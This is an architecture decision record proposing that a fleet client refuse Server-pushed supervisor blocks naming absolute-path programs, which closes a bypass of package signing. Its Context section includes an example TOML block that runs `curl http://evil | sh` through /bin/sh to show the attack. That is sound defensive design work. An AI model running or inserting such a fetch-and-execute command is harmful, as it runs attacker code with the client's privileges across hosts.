# ADR-0057: A Server-pushed `[[supervisor]]` block may name only a Client-owned program

- **Status:** 🟡 proposed
- **Date:** 2026-08-13
- **Deciders:** Markus Brigl

## Context

[ADR-0056](0056-the-client-accepts-its-supervisor-set-from-the-server.md) lets the Server deliver
the Client's `[[supervisor]]` set: a Configuration typed `opamp-fleet-client` carries the blocks,
and a matching Client writes them into its own `client.toml` and starts them. Point 2 of that
decision validates the merged document "by the same loader that validates `client.toml` at startup
(block schema, program-path resolution, ports, timeouts)."

That reuse is exactly the gap. `resolve_program` (`crates/client/src/config.rs`) accepts two shapes:
a **bare file name**, which lives in `<supervisor_dir>/<name>/program/` — a directory this Client
creates and owns, and the whole of the host's consent to being updated (ADR-0021) — and an
**absolute path**, which is *the machine's* program, spawned but never written to (`owned = false`).
Both are legitimate in a `client.toml` **the operator wrote**, because the operator owns the host
and may point a Supervisor at any binary on it.

A Server-pushed block is a different principal. When the loader accepts an absolute path from an
offered document, a Server — or anyone who has compromised one, *without* the package-signing key —
can push:

```toml
[[supervisor]]
type = "command"
name = "x"
command = "/bin/sh"
args = ["-c", "curl http://evil | sh"]
```

and the Client spawns it. This is fleet-wide command execution as the Client's user (root under a
service install) that needs **no** Ed25519 signature and no content hash — it side-steps the entire
`[packages] verification_key` machinery the rest of the Client enforces. A security review raised it;
`crates/client/src/reconfigure.rs` calls `validate_block`, which resolves the program the ordinary
way and imposes no owned-only rule.

The forces:

- **The operator's file and the Server's push are different trust levels.** ADR-0056 already draws
  this line for *globals* — endpoint, credentials, and `state_dir` are the host's trust anchors and
  "the Server must never write" them. The program a Supervisor spawns is the same kind of anchor:
  naming an arbitrary absolute path *is* choosing what code runs on the host, which is precisely
  what admission (ADR-0013) plus package signing (ADR-0015/0018) exist to gate.
- **Package delivery already has a consent model.** A bare name means "this Client owns the
  directory, so the Server may install here" (ADR-0021). A pushed Supervisor whose program is a bare
  name is therefore *already* consenting to run Server-delivered, signature-verified artifacts —
  nothing more is needed for the Server to put a program there legitimately.
- **An absolute path adds nothing the fleet path needs.** A Server-managed Supervisor exists to run
  what the Server delivers; pointing it at a pre-existing machine binary is the operator's local
  concern, not a fleet rollout. Refusing absolute paths in a pushed block costs the delivery path no
  capability it is meant to have.
- **This is not the case ADR-0056 argued through.** ADR-0056's Context reasons about globals as
  trust anchors; the program path inside a block was carried along by "the same loader," not decided
  on its own merits. That silent inheritance is what this ADR corrects.

## Decision

We will make the Client **refuse a Server-offered Supervisor set in which any `[[supervisor]]` block
names a program that is not this Client's own** — i.e. the program (and, for a tree, its
`program_path`) must resolve to a **bare file name** (`owned = true`), never an absolute path. The
refusal is a validation failure of the whole offer: nothing is stopped, nothing is written, the
running set stays in force, and the self-Agent reports the offer `FAILED` with a reason that names
the offending block and program (ADR-0056 point 5).

The rule binds **only the delivery path**. A `[[supervisor]]` block an operator writes in
`client.toml` on the host keeps accepting an absolute path exactly as today — the operator owns the
host, and ADR-0056 point 6 ("no offer, no change") is unaffected. The distinction is enforced in the
apply path (`reconfigure.rs`), which knows the blocks came from an offer, not in `resolve_program`,
which cannot and must not tell the two principals apart.

This tightens ADR-0056 point 2: the merged document is still validated by the startup loader, and
then the offered blocks additionally must all be `owned`. ADR-0056 is otherwise unchanged and stays
accepted; this ADR adds the owned-only constraint the delivery path was missing.

## Alternatives considered

- **Leave it as is — the Server is trusted to manage Agents.** Rejected: it makes the whole
  package-signing apparatus decorative. The threat is a Server compromised below the signing key
  (a leaked REST credential, a mis-scoped operator); signing is meant to keep such an actor from
  running arbitrary code, and an unsigned absolute-path spawn is the exact bypass. Admission is a
  fleet-wide trust boundary (ADR-0047), but that boundary is about *identity between Agents*, not a
  licence for the Server to run any binary on every host.
- **Allowlist specific absolute paths in `client.toml`.** Rejected: it reintroduces host-local
  policy the operator would have to maintain per host, and the fleet path has no need of absolute
  paths at all — the bare-name/owned case already covers everything a Server-delivered Supervisor
  does. A configurable escape hatch is complexity for a capability with no established use.
- **Enforce the rule inside `resolve_program` for every caller.** Rejected: it would break the
  operator's own legitimate absolute-path Supervisors written in `client.toml`, which ADR-0056
  point 6 preserves. The constraint belongs to the *principal* (Server push), not to path
  resolution, so it lives in the apply path that knows the principal.
- **Warn and apply anyway.** Rejected: a warning on a code-execution boundary is not a control. The
  offer is refused as a whole, consistent with how ADR-0056 already treats a merge that fails
  validation.

## Sources / Prior art

- OpAMP Supervisor (opamp-go) and the Collector's Supervisor deliver an *agent the Supervisor
  itself owns and installs*; they do not offer "run this arbitrary host binary" as a remote-config
  primitive — the managed executable is the Supervisor's own, which is the owned-only shape this ADR
  makes mandatory for the pushed case.
- The consent-by-ownership model this builds on is this project's own ADR-0021 (a bare name is the
  host's consent to package installation) and ADR-0015/0018 (signed, hash-verified delivery).

## Consequences

- Positive: the package-signing trust model holds even against a Server compromised below the
  signing key — a pushed Supervisor set can only ever run Client-owned programs, which are
  themselves delivered as signature/hash-verified packages. The delivery path's code-execution
  surface collapses to exactly what ADR-0021 already consents to.
- Positive: the operator's local authority is unchanged — an absolute-path Supervisor in a
  hand-written `client.toml` still runs. The two principals are treated as the two trust levels
  they are, matching the globals boundary ADR-0056 already drew.
- Negative / trade-offs: a Server cannot deliver a Supervisor that runs a pre-existing machine
  binary. This is an intentional loss of a capability that had no fleet-shaped use and a real
  code-execution risk; an operator who genuinely wants a Supervisor over a machine binary writes
  that block locally.
- Follow-ups: a regression test that a pushed set with an absolute-path program is refused `FAILED`
  and touches neither the running set nor the file; the shipped example `client.toml` prose and the
  rollout/client manuals note that Server-delivered Supervisor blocks must name a bare program.
